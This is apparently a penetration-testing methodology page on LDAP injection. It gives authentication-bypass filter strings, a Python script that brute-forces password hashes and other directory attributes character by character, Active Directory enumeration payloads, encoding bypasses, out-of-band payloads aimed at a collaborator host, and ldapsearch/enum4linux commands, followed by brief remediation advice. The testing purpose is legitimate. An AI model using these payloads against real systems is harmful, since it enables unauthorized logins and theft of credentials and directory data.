---
title: "LDAP Injection"
date: 2026-02-24
draft: false
---

# LDAP Injection

> **Severity**: High–Critical | **CWE**: CWE-90
> **OWASP**: A03:2021 – Injection

---

## What Is LDAP Injection?

LDAP (Lightweight Directory Access Protocol) is used for authentication and directory lookup in enterprise environments — Active Directory, OpenLDAP, Oracle Directory Server. LDAP injection occurs when user input is inserted into LDAP filter queries without sanitization, allowing filter logic manipulation.

```
LDAP filter syntax:
  (&(uid=USERNAME)(password=PASSWORD))   ← AND: both must match

Injection:
  Username: admin)(&
  Filter becomes: (&(uid=admin)(&)(password=anything))
                             ↑ always-true subfilter → auth bypass
```

Two attack modes:
- **Authentication bypass** — manipulate filter logic to authenticate without valid credentials
- **Blind data exfiltration** — exploit boolean responses to enumerate attributes character by character

---

## Discovery Checklist

**Phase 1 — Input Surface**
- [ ] Find LDAP-backed login forms (typical in corporate SSO, VPN portals, Exchange OWA, Confluence, Jira, Jenkins with LDAP auth)
- [ ] Find LDAP-backed search/lookup features (address books, employee directories, user search)
- [ ] Look for `(&`, `(|`, LDAP error messages in responses
- [ ] Inject `*` in username/search — does it return all users? → blind wildcard match

**Phase 2 — Filter Analysis**
- [ ] Determine filter structure from error messages or behavior
- [ ] Test single paren `)` — does it break the query?
- [ ] Test `*` — wildcard match (returns more/all results)
- [ ] Test null byte `%00` — truncation
- [ ] Test `)(uid=*` — try to close current condition and add new one

**Phase 3 — Exploitation**
- [ ] Test auth bypass with all operator injection variants
- [ ] Test OR-based bypass: `*)(uid=*`
- [ ] Test blind enumeration with `*` prefix/suffix position
- [ ] Attempt OOB via crafted DN values that trigger DNS lookups

---

## Payload Library

### Payload 1 — Authentication Bypass

```
# Typical LDAP auth filter:
# (&(uid=USERNAME)(userPassword=PASSWORD))

# Bypass with wildcard password:
Username: admin
Password: *
# Filter: (&(uid=admin)(userPassword=*)) → matches any password for admin

# Close filter and inject always-true:
Username: admin)(&
Password: anything
# Filter: (&(uid=admin)(&)(userPassword=anything)) → middle (&) always true → auth bypass

# OR injection — match any user:
Username: *)(uid=*
Password: anything
# Filter: (&(uid=*)(uid=*)(userPassword=anything)) → matches first user

# OR operator:
Username: admin)(|(uid=*
Password: x
# Filter: (&(uid=admin)(|(uid=*)(userPassword=x))) → OR makes it true

# Null attribute bypass (some LDAP implementations):
Username: admin
Password: *)(objectClass=*
# Filter: (&(uid=admin)(userPassword=*)(objectClass=*)) → may bypass if objectClass always matches

# Full bypass — no username needed:
Username: *
Password: *
# Filter: (&(uid=*)(userPassword=*)) → matches any entry with uid and userPassword

# Inject into different positions depending on filter structure:
# (&(uid=USERNAME)(department=DEPARTMENT))
# Username: *)(&
# Filter: (&(uid=*)(&)(department=X)) → auth bypass

# Nested parentheses bypass:
Username: admin))%00
# Null byte terminates filter → may cause partial evaluation
```

### Payload 2 — Blind Attribute Enumeration

Extract attribute values character by character using boolean responses.

```python
# Python automation for blind LDAP attribute extraction:
import requests
import string

TARGET = "https://target.com/login"
CHARS = string.printable.replace("*", "").replace("\\", "").replace("(", "").replace(")", "")

def test_prefix(attr, prefix):
    """Test if attribute value starts with prefix"""
    payload = f"admin)({attr}={prefix}*"
    # Filter becomes: (&(uid=admin)(ATTR=PREFIX*)(userPassword=x))
    r = requests.post(TARGET, data={
        "username": payload,
        "password": "x"
    })
    # Adjust success indicator for your target:
    return "Welcome" in r.text or r.status_code == 302

def extract_attribute(attr, max_len=50):
    """Extract full attribute value"""
    known = ""
    for _ in range(max_len):
        found = False
        for c in CHARS:
            if test_prefix(attr, known + c):
                known += c
                print(f"[+] {attr}: {known}")
                found = True
                break
        if not found:
            break
    return known

# Extract useful attributes:
print(extract_attribute("userPassword"))     # password hash
print(extract_attribute("mail"))             # email
print(extract_attribute("telephoneNumber"))  # phone
print(extract_attribute("memberOf"))         # group membership
print(extract_attribute("employeeID"))       # employee ID
```

```
# Manual blind payloads (send one at a time, observe response):

# Does admin's password hash start with 'a'?
Username: admin)(userPassword=a*
Password: anything

# Enumerate first char of admin's mail attribute:
Username: admin)(mail=a*
Password: anything
Username: admin)(mail=b*
Password: anything
...

# Extract cn (Common Name) to enumerate users:
Username: *)(cn=a*
Username: *)(cn=b*
# → when response differs, first char found

# Enumerate group membership:
Username: admin)(memberOf=CN=Domain Admins*
Username: admin)(memberOf=CN=IT*
```

### Payload 3 — Active Directory Specific

```
# AD LDAP filter format:
# (&(sAMAccountName=USERNAME)(objectCategory=user))

# AD auth bypass:
Username: admin)(objectClass=*
Password: *

# Enumerate AD groups:
Username: *)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=com
# → if login succeeds, admin is in Domain Admins

# AD special attributes to enumerate:
# sAMAccountName — login name
# userPrincipalName — UPN (user@domain.com)
# memberOf — group membership
# mail — email address
# pwdLastSet — password last set timestamp
# userAccountControl — account flags (disabled, locked, etc.)
# msDS-AllowedToDelegateTo — Kerberos delegation

# Test if account is disabled (userAccountControl flag 2):
Username: admin)(userAccountControl=514  # 514 = NORMAL_ACCOUNT + ACCOUNTDISABLE
Username: admin)(userAccountControl=512  # 512 = NORMAL_ACCOUNT only (enabled)

# Extract CN of all users (blind):
Username: *)(objectClass=user)(cn=a*
# Iterate to enumerate all users starting with 'a', 'b', etc.

# Password policy enumeration:
Username: *)(msDS-PasswordHistoryLength=*
Username: *)(lockoutThreshold=*
```

### Payload 4 — LDAP Search Injection (Directory Services)

```
# If search uses: (&(objectClass=USER_TYPE)(cn=SEARCH_TERM))

# Wildcard dump all:
SEARCH_TERM: *
# Filter: (&(objectClass=person)(cn=*)) → returns all entries

# Attribute injection — add extra conditions to narrow/expand:
SEARCH_TERM: *)(objectClass=*
# Filter: (&(objectClass=person)(cn=*)(objectClass=*)) → all objects

# Extract sensitive objects:
SEARCH_TERM: *)(objectClass=inetOrgPerson
SEARCH_TERM: *)(objectClass=groupOfNames
SEARCH_TERM: *)(objectClass=computer     # → enumerate computers (AD)

# Admin/privileged user discovery:
SEARCH_TERM: *)(uid=admin*
SEARCH_TERM: *)(description=*admin*
SEARCH_TERM: *)(title=*Manager*

# Data exfil from directory:
SEARCH_TERM: *)(userPassword=*   # → include password hashes in results
```

### Payload 5 — Special Character Bypass

```
# LDAP special chars that need escaping (but are often not):
# ( ) * \ NUL

# If filter sanitizes ) but not *:
Username: admin*
# Might match admin, administrator, admins

# If filter escapes * using \2a but not other chars:
Username: admin\2a    # literal * → same as admin*

# Null byte truncation (some implementations):
Username: admin%00)(uid=*

# Unicode variants for parentheses:
Username: admin%ef%bc%89    # fullwidth ) → ）
Username: admin%EF%BC%88    # fullwidth ( → （

# Double URL encode:
Username: admin%2529    # %29 = ) → %2529 → double-decoded to )

# Backslash injection (LDAP escaping bypass):
Username: admin\29    # hex escape for )
Username: admin\28uid\3d*\29    # injects (uid=*)
```

### Payload 6 — OOB via LDAP URL Injection

```
# Inject LDAP URL reference to trigger OOB connection:
# If server performs LDAP lookup using user-controlled DN:

# Inject referral to attacker LDAP server:
Username: admin)(!(objectClass=void

# Via userPassword with LDAP URL format:
Username: admin
Password: ldap://COLLABORATOR_ID.oast.pro/dc=test,dc=com

# Some LDAP servers follow referrals:
Username: cn=admin,dc=corp,dc=com
# Modify DN to attacker's server:
Username: cn=admin,dc=COLLABORATOR_ID.oast.pro

# Test via interactsh or Burp Collaborator:
# Monitor DNS for lookups from target IP
```

---

## Tools

```bash
# ldap3 Python library — manual LDAP interaction:
pip3 install ldap3
python3 -c "
from ldap3 import Server, Connection, ALL
server = Server('ldap://target.com', get_info=ALL)
# Anonymous bind:
conn = Connection(server, auto_bind=True)
# Search all users:
conn.search('dc=corp,dc=com', '(objectClass=person)',
            attributes=['cn','mail','sAMAccountName','memberOf'])
for entry in conn.entries:
    print(entry)
"

# ldapsearch — command line LDAP client:
# Anonymous search:
ldapsearch -x -H ldap://target.com -b "dc=corp,dc=com" "(objectClass=*)"

# With credentials:
ldapsearch -x -H ldap://target.com \
  -D "cn=admin,dc=corp,dc=com" \
  -w "password" \
  -b "dc=corp,dc=com" \
  "(objectClass=user)" cn mail sAMAccountName

# Automated LDAP injection with Burp Intruder:
# Payload list for username field:
# * ) admin)(&  admin)(uid=*  *)(uid=*  admin)%00
# Load: /usr/share/seclists/Fuzzing/LDAP.Injection.Fuzz.Strings.txt

# ldap-brute (Nmap script):
nmap -p 389 --script ldap-brute \
  --script-args ldap.base="dc=corp,dc=com" target.com

# enum4linux — AD/LDAP enumeration:
enum4linux -a target.com
enum4linux -U target.com    # enumerate users
enum4linux -G target.com    # enumerate groups

# BloodHound / ldapdomaindump — AD enumeration:
ldapdomaindump -u 'DOMAIN\user' -p 'password' ldap://target.com

# Test for anonymous LDAP bind:
ldapsearch -x -H ldap://target.com -b "" -s base namingContexts
# → If returns data → anonymous bind allowed

# Find LDAP injection points in web app:
# Burp → search responses for: uid= cn= mail= sAMAccountName= LDAP
grep -rn "LdapContext\|DirContext\|InitialDirContext\|ldap://" --include="*.java" src/
grep -rn "filter.*\+" --include="*.java" src/    # string concat in LDAP filter
```

---

## Remediation Reference

- **LDAP parameterization**: use LDAP-safe libraries that parameterize filters — never concatenate user input
- **Escape special chars**: escape `( ) * \ NUL` per RFC 4515 before inserting into filter
- **Whitelist character set**: usernames/search terms should only contain alphanumerics, hyphens, periods
- **Disable anonymous bind**: require authentication for all LDAP queries
- **Least privilege LDAP account**: service account should only read necessary attributes/OUs
- **Schema restrictions**: restrict which attributes the service account can read (no `userPassword` unless required)
- **Java LDAP**: use `javax.naming.ldap.LdapName` for DN manipulation; `DirContext.search()` with proper `SearchControls`

*Part of the Web Application Penetration Testing Methodology series.*
